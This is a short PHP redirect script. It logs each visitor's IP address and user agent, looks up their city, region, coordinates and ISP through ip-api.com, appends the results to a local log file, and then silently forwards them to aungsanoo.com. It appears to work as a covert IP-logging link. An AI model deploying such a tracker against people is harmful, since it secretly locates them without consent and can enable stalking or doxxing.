<?php
// Get IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get user agent (browser and device info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Use a third-party API to get geolocation (IPinfo, ip-api, etc.)
$location_data = file_get_contents("http://ip-api.com/json/{$ip}");
$location = json_decode($location_data, true);

// Extract location info
$country = $location['country'] ?? 'Unknown';
$region = $location['regionName'] ?? 'Unknown';
$city = $location['city'] ?? 'Unknown';
$lat = $location['lat'] ?? 'Unknown';
$lon = $location['lon'] ?? 'Unknown';
$isp = $location['isp'] ?? 'Unknown';

// Log the data
$log_data = "IP: $ip | Country: $country | Region: $region | City: $city | ISP: $isp | Lat: $lat | Lon: $lon | User-Agent: $user_agent\n";

// Save to log file
file_put_contents('visitors.log', $log_data, FILE_APPEND);

// Redirect the user to a target page
header('Location: https://aungsanoo.com');
exit;
?>
